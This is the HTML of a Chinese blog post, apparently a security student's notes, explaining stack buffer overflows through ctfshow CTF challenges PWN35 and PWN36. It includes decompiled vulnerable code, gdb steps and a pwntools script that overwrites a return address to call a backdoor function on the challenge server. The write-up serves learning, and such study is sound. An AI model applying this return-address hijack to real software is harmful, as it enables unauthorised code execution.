@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"gh0stf0xy.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="·栈溢出的原理栈以及栈的结构栈（Stack）是程序运行时用于存储局部变量、函数调用信息（如返回地址）等数据的内存区域。栈溢出是指当程序向栈中写入数据时，超出了预先分配的栈空间，导致覆盖了栈上的其他数据。存储在栈上的东西主要包括：  返回地址（Return Address）：函数调用时，返回地址会被压入栈中，用于在函数执行完毕后返回到调用者。如果返回地址被覆盖，攻击者可以控制程序跳转到任意地址。 局">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出原理及其应用">
+<meta property="og:url" content="http://gh0stf0xy.github.io/2025/04/21/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/index.html">
+<meta property="og:site_name" content="GhostFoxy&#39;s Blog">
+<meta property="og:description" content="·栈溢出的原理栈以及栈的结构栈（Stack）是程序运行时用于存储局部变量、函数调用信息（如返回地址）等数据的内存区域。栈溢出是指当程序向栈中写入数据时，超出了预先分配的栈空间，导致覆盖了栈上的其他数据。存储在栈上的东西主要包括：  返回地址（Return Address）：函数调用时，返回地址会被压入栈中，用于在函数执行完毕后返回到调用者。如果返回地址被覆盖，攻击者可以控制程序跳转到任意地址。 局">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://gh0stf0xy.github.io/images/27f6d95b67494cc68e82b09de57eac7c.png">
+<meta property="og:image" content="http://gh0stf0xy.github.io/images/03ea3793112442538a010eee7b30a773.png">
+<meta property="og:image" content="http://gh0stf0xy.github.io/images/19fe8636e31046e7a65626c42be43b0f.png">
+<meta property="og:image" content="http://gh0stf0xy.github.io/images/588d894a3fb94d048e9567baffee9ec2.png">
+<meta property="og:image" content="http://gh0stf0xy.github.io/images/e55158e506a84895856c2d5084facf4a.png">
+<meta property="og:image" content="http://gh0stf0xy.github.io/images/9528a9c470d04193b8ca0e7c2e1e9f6b.png">
+<meta property="og:image" content="http://gh0stf0xy.github.io/images/5e5ea15162414217b92a539cc797d680.png">
+<meta property="og:image" content="http://gh0stf0xy.github.io/images/74c7d4bd53a14348a393532222f7b449.png">
+<meta property="og:image" content="http://gh0stf0xy.github.io/images/5d0f08f38fe042268b15543b1563c056.png">
+<meta property="og:image" content="http://gh0stf0xy.github.io/images/1916628a85044d72a501283c2c947080.png">
+<meta property="og:image" content="http://gh0stf0xy.github.io/images/7528a6f7dea047119137da4c37dd00a3.png">
+<meta property="article:published_time" content="2025-04-21T08:12:54.000Z">
+<meta property="article:modified_time" content="2025-04-21T08:33:35.106Z">
+<meta property="article:author" content="GhostFoxy">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="栈溢出">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://gh0stf0xy.github.io/images/27f6d95b67494cc68e82b09de57eac7c.png">
+
+<link rel="canonical" href="http://gh0stf0xy.github.io/2025/04/21/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>栈溢出原理及其应用 | GhostFoxy's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">GhostFoxy's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://gh0stf0xy.github.io/2025/04/21/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/IMG_0126.JPG">
+      <meta itemprop="name" content="GhostFoxy">
+      <meta itemprop="description" content="网络安全专业大学生的学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="GhostFoxy's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          栈溢出原理及其应用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-04-21 16:12:54 / 修改时间：16:33:35" itemprop="dateCreated datePublished" datetime="2025-04-21T16:12:54+08:00">2025-04-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="·栈溢出的原理"><a href="#·栈溢出的原理" class="headerlink" title="·栈溢出的原理"></a>·栈溢出的原理</h1><h3 id="栈以及栈的结构"><a href="#栈以及栈的结构" class="headerlink" title="栈以及栈的结构"></a>栈以及栈的结构</h3><p>栈（Stack）是程序运行时用于存储局部变量、函数调用信息（如返回地址）等数据的内存区域。栈溢出是指当程序向栈中写入数据时，超出了预先分配的栈空间，导致覆盖了栈上的其他数据。存储在栈上的东西主要包括：</p>
+<ul>
+<li><strong>返回地址（Return Address）</strong>：函数调用时，返回地址会被压入栈中，用于在函数执行完毕后返回到调用者。如果返回地址被覆盖，攻击者可以控制程序跳转到任意地址。</li>
+<li><strong>局部变量</strong>：函数中的局部变量通常存储在栈上，如果输入数据过长，可能会覆盖这些变量。</li>
+<li><strong>前一个栈帧的指针</strong>：当一个函数被调用时，栈中会分配一块内存空间（称为栈帧），用于恢复调用者的栈帧。</li>
+</ul>
+<span id="more"></span>
+
+
+
+<p>例如：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">stack_function</span><span class="params">(<span class="type">char</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="type">char</span> stack[<span class="number">10</span>];<span class="comment">//局部变量（缓冲区）</span></span><br><span class="line">      <span class="built_in">strcpy</span>(stack,input);<span class="comment">//strcpy为危险函数，未检查输入字符串长度，容易导致栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p> 因为在栈中，调用的局部变量stack指向的地址和返回地址是<strong>相邻的</strong>。如果stack溢出，多余的数据会覆盖返回地址。我们可以利用这一点特性，对程序注入攻击payload，达到劫持程序控制流的目的。</p>
+<p>具体做法我们可以通过ctfshow中的最基础的栈溢出的题目来体现：</p>
+<h2 id="PWN35"><a href="#PWN35" class="headerlink" title="PWN35"></a>PWN35</h2><p><img src="/images/27f6d95b67494cc68e82b09de57eac7c.png" alt="img"></p>
+<p> 打开虚拟机，ssh连接，拿到题目的shell</p>
+<p><img src="/images/03ea3793112442538a010eee7b30a773.png" alt="img"></p>
+<p> 题目还给了一个二进制文件，拖到ida里面看看</p>
+<p><img src="/images/19fe8636e31046e7a65626c42be43b0f.png" alt="img"></p>
+<p>代码分析（偷懒一下就只分析关键的地方）：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">FILE *stream; <span class="comment">// [esp+0h] [ebp-1Ch] //定义输出流指针</span></span><br><span class="line"></span><br><span class="line">  stream = <span class="built_in">fopen</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);<span class="comment">//读取文件/ctfshow_flag并存储到指针stream中</span></span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;<span class="comment">//如果flag文件是空的，那么结束程序</span></span><br><span class="line">  <span class="built_in">fgets</span>(flag, <span class="number">64</span>, stream);<span class="comment">//将flag文件中的内容存储到变量flag中</span></span><br><span class="line">  <span class="built_in">signal</span>(<span class="number">11</span>, (<span class="type">__sighandler_t</span>)sigsegv_handler);<span class="comment">//为信号 11（即 SIGSEGV）注册一个处理函数 sigsegv_handler，当程序发生段错误时，操作系统会调用 sigsegv_handler 函数，而不是终止程序。</span></span><br></pre></td></tr></table></figure>
+
+<p> 发现程序有了编号为11的信号（即SIGSEGV信号，段错误）时，执行sigsegv_handler（）函数</p>
+<p>打开该函数，观察到执行之后能输出flag的值，这是我们想要得到的结果，即让程序发生段错误，这个过程就是利用了栈溢出，即局部变量超出了栈的限制</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __noreturn <span class="title">sigsegv_handler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;%s\n&quot;</span>, flag);<span class="comment">//输出变量flag的值</span></span><br><span class="line">  <span class="built_in">fflush</span>(stderr);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在输出一堆无用的提示信息后，执行下列程序 </p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( argc &lt;= <span class="number">1</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">ctfshow</span>((<span class="type">char</span> *)argv[<span class="number">1</span>]);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;QaQ!FLAG IS NOT HERE! Here is your input : %s&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里顺便讲一下argc和argv变量：</p>
+<p>在C语言中，argc是main函数的第一个参数，表示命令行参数的数量，他总是至少为1，因为第一个命令行参数（argv[0]）是程序的名称，不能为空。argv是main函数的第二个参数，是一个字符串数组，存储了所有命令行参数。argv[0]是程序的名称，argv[0]到argv[argc-1]是用户传递的参数。</p>
+<p>则我们后面输入的参数就是argv[1]，只要有输入，argc就会大于1，执行ctfshow函数：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> *__cdecl <span class="title">ctfshow</span><span class="params">(<span class="type">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(dest, src);<span class="comment">//将src字符串的值粘贴到数组dest中，但strcpy函数没有限制或检查长度的功能，所以这里是栈溢出的突破口，即 将argv[1]的值（传给*src的字符串）的长度超出104即可</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/588d894a3fb94d048e9567baffee9ec2.png" alt="img"></p>
+<p>成功拿到flag。</p>
+<p>这个就是栈溢出最基本的应用，后面还有许多的情况。 </p>
+<h1 id="后门函数"><a href="#后门函数" class="headerlink" title="后门函数"></a>后门函数</h1><p>栈溢出攻击的核心目标就是覆盖函数的返回地址，将其篡改为攻击者控制的恶意代码的地址（典型如后门函数），从而劫持程序执行流程。</p>
+<p>如果一个程序中存在后门函数，我们可以利用栈溢出原理，将后门函数的地址覆盖到堆栈中，从而达到让目标程序执行后门函数的目的。</p>
+<p>通过底层原理来解释为什么栈溢出能够覆盖到返回地址：</p>
+<h3 id="1-堆栈结构与偏移量的来源"><a href="#1-堆栈结构与偏移量的来源" class="headerlink" title="1.堆栈结构与偏移量的来源"></a>1.堆栈结构与偏移量的来源</h3><p>在函数调用的过程中，栈帧依次会存储以下内容（32位的程序）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+------------------+</span><br><span class="line">| 函数参数         | &lt;--- 高地址</span><br><span class="line">+------------------+</span><br><span class="line">| 返回地址         | &lt;--- EIP寄存器跳转的目标地址</span><br><span class="line">+------------------+</span><br><span class="line">| 旧的EBP          | &lt;--- 当前函数的基址指针（保存调用者的EBP）</span><br><span class="line">+------------------+</span><br><span class="line">| 局部变量（数组） | &lt;--- 溢出起点（如char buffer[64]）</span><br><span class="line">+------------------+</span><br><span class="line">| ...              | &lt;--- 其他局部变量或填充</span><br><span class="line">+------------------+</span><br><span class="line">| 当前ESP位置      | &lt;--- 低地址（栈顶）</span><br></pre></td></tr></table></figure>
+
+<p> 在函数的调用中，栈内存从高地址向低地址方向增长，即压栈过程中，栈顶指针ESP向低地址移动。</p>
+<p>而数据填充过程中，数据是从低地址往高地址方向填充的，因为数组buffer[0]~buffer[n]所在的地址是从低到高的。</p>
+<p>压栈方向与数据填充方向相反，所以通过栈溢出能够做到覆盖返回地址而不是继续填充栈帧！</p>
+<p>说完了可行性，那么如何知道怎么填充数据呢？填充多少呢？</p>
+<p>这时候我们就要引入一个概念：<strong>偏移量</strong>。</p>
+<p>偏移量就是指从局部数组的起始位置到函数的返回地址的字节距离，填充数据从buffer[0]开始，往高地址填充时能确保覆盖返回地址的字节距离。</p>
+<p>由上图可知，要确保覆盖返回地址，我们需要做的是构造 数组所占字节长度（数组名4字节+数组元素n字节）+ ebp（栈底）长度4字节+覆盖的信息（这个就直接覆盖了函数的返回地址，代替原返回数据返回给了函数），这样就做到了将攻击代码的地址返回给了函数。</p>
+<h3 id="2-函数调用的底层逻辑"><a href="#2-函数调用的底层逻辑" class="headerlink" title="2.函数调用的底层逻辑"></a>2.函数调用的底层逻辑</h3><p>上述描述引出了一个问题：为什么将后门地址覆盖到原函数的返回地址上就能跳转到后门函数？</p>
+<h4 id="返回值的本质"><a href="#返回值的本质" class="headerlink" title="返回值的本质"></a>返回值的本质</h4><p>我们从最简单的原理引入来帮助我们理解这个问题。比如：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b; <span class="comment">// 返回计算结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一个计算两个值相加的函数，调用add(3,5)之后，返回的值8会返回调用者。（比如在main()函数中调用add,8会返回给main函数供main函数使用）</p>
+<h4 id="返回值的底层实现"><a href="#返回值的底层实现" class="headerlink" title="返回值的底层实现"></a>返回值的底层实现</h4><h5 id="1-调用函数（call指令）"><a href="#1-调用函数（call指令）" class="headerlink" title="1.调用函数（call指令）"></a>1.调用函数（call指令）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">; 示例代码：main 函数调用 func</span><br><span class="line">main:</span><br><span class="line">    mov eax, 10</span><br><span class="line">    push eax         ; 传递参数（假设为 cdecl 调用约定）</span><br><span class="line">    call func        ; 调用 func</span><br><span class="line">    add esp, 4       ; 清理栈（调用者清理参数）</span><br><span class="line">    ; 后续代码...</span><br><span class="line"></span><br><span class="line">func:</span><br><span class="line">    push ebp         ; 保存调用者的栈帧基址</span><br><span class="line">    mov ebp, esp     ; 设置当前栈帧基址</span><br><span class="line">    sub esp, 8       ; 分配局部变量空间</span><br><span class="line">    ; 函数逻辑...</span><br></pre></td></tr></table></figure>
+
+<p><strong>call的底层逻辑行为</strong></p>
+<p>1.将返回地址（即下一条指令add sep, 4 的地址）压入栈顶。</p>
+<p>2.跳转到目标函数func()的地址，更新EIP（存储CPU下一条要执行的指令的内存地址的寄存器）为func（）函数的入口。</p>
+<h4 id="2-函数返回（ret指令）"><a href="#2-函数返回（ret指令）" class="headerlink" title="2.函数返回（ret指令）"></a>2.函数返回（ret指令）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">func:</span><br><span class="line">    ; ...函数逻辑</span><br><span class="line">    mov esp, ebp     ; 恢复栈指针（释放局部变量）</span><br><span class="line">    pop ebp          ; 恢复调用者的栈帧基址</span><br><span class="line">    ret              ; 返回到调用者</span><br></pre></td></tr></table></figure>
+
+<p> 1.从栈顶弹出返回地址到EIP。</p>
+<p>2.跳转到该地址，继续执行调用者（即main主函数）的代码</p>
+<h5 id="3-栈溢出"><a href="#3-栈溢出" class="headerlink" title="3.栈溢出"></a>3.栈溢出</h5><p>在执行call指令后，ret指令前，栈溢出会导致原先在栈底的返回地址被覆盖成目标恶意代码的返回地址，该返回地址在ret指令后会被弹出到EIP，从而导致函数返回的地址不再是调用者，而是恶意代码。</p>
+<p>我们可以通过具体的题目来展示这一过程：</p>
+<h1 id="PWN36"><a href="#PWN36" class="headerlink" title="PWN36"></a>PWN36</h1><p>题目直接告诉我们有一个后门函数，并提供了源文件，如图。</p>
+<p> <img src="/images/e55158e506a84895856c2d5084facf4a.png" alt="img"></p>
+<p>用ida pro打开文件，如图，得到文件的源代码 <img src="/images/9528a9c470d04193b8ca0e7c2e1e9f6b.png" alt="img"></p>
+<p>主函数里只有一个比较重要的ctfshow()函数，因为上面都是在输出废话。 <img src="/images/5e5ea15162414217b92a539cc797d680.png" alt="img"></p>
+<p>查看ctfshow()函数，一个36个元素的数组和一个gets()函数，由于gets()函数没有输入长度的限制，所以输入长度超过36是做得到的，典型的栈溢出。那么怎么找到flag呢？</p>
+<p>注意看有一个后门函数：get_flag()，打开查看</p>
+<p><img src="/images/74c7d4bd53a14348a393532222f7b449.png" alt="img"></p>
+<p>代码解释：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF //定义一个数组</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]//定义一个文件输入流指针</span></span><br><span class="line"></span><br><span class="line">  stream = <span class="built_in">fopen</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);<span class="comment">//以只读方式（&quot;r&quot;）将文件/ctfshow_flag输入进stream</span></span><br><span class="line">  <span class="keyword">if</span> ( !stream )<span class="comment">//如果文件为空</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);<span class="comment">//输出报错信息：找不到该文件</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">//函数结束</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">64</span>, stream);<span class="comment">//文件输入流stream将读到的文件信息传递给数组s</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);<span class="comment">//输出s信息（即flag）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为后门函数将元素个数定在64个，大于待攻击的函数的36个，所以不用担心get_flag()的堆栈会溢出（即不能正确执行get_flag()导致无法正常输出flag）</p>
+<p>因为对输入用于攻击的数据要有精确的控制，既要有一定量的字符填满缓冲区导致其溢出，又要有get_flag()函数的地址，构造出一个精确的数据，我们需要借助程序实现目标数据的生成，即所谓的payload。</p>
+<p>如何获取函数的地址？</p>
+<p>打开ubuntu虚拟机，用gdb调试打开文件pwn：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb ./pwn 调用gdb打开pwn文件</span><br><span class="line">disass get_flag 将pwn文件中的get_flag()函数转化为汇编语言，以便于查看函数的地址</span><br></pre></td></tr></table></figure>
+
+<p>如图，得到get_flag()地址为0x08048586 </p>
+<p><img src="/images/5d0f08f38fe042268b15543b1563c056.png" alt="img">编辑</p>
+<p>从函数ctfshow()的定义数组那一行中，能计算出偏移量为0x28+0x4（包括s[]的起始地址ebp-0x28到结束地址ebp-0x4占总共0x24字节,旧ebp的字节大小0x4,返回地址0x4字节）</p>
+<p>由此构造payload:</p>
+<p><img src="/images/1916628a85044d72a501283c2c947080.png" alt="img"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment"># 调用库pwntools</span></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28224</span>) <span class="comment"># 远程连接题目地址</span></span><br><span class="line">offset = <span class="number">0x28</span> + <span class="number">0x4</span> <span class="comment"># 构造偏移量用于填充栈从而利用栈溢出进行攻击</span></span><br><span class="line">backdoor_addr = <span class="number">0x08048586</span> <span class="comment"># 后门函数的地址</span></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(backdoor_addr) <span class="comment"># 构造payload,这个就是恶意数据 p32()是pwntools库中一个函数，作用是将一个32位的整数转换为小端序字符串\x86\x85\x04\x08，能被系统识别地址</span></span><br><span class="line">p.sendline(payload) <span class="comment"># 发送payload到目标服务器</span></span><br><span class="line">p.interactive() <span class="comment"># 提供交互，用于查找flag</span></span><br></pre></td></tr></table></figure>
+
+<p>执行payload代码后得到flag </p>
+<p> <img src="/images/7528a6f7dea047119137da4c37dd00a3.png" alt="img"></p>
+<p> 以上是栈溢出最基本的原理以及应用。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"># 栈溢出</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
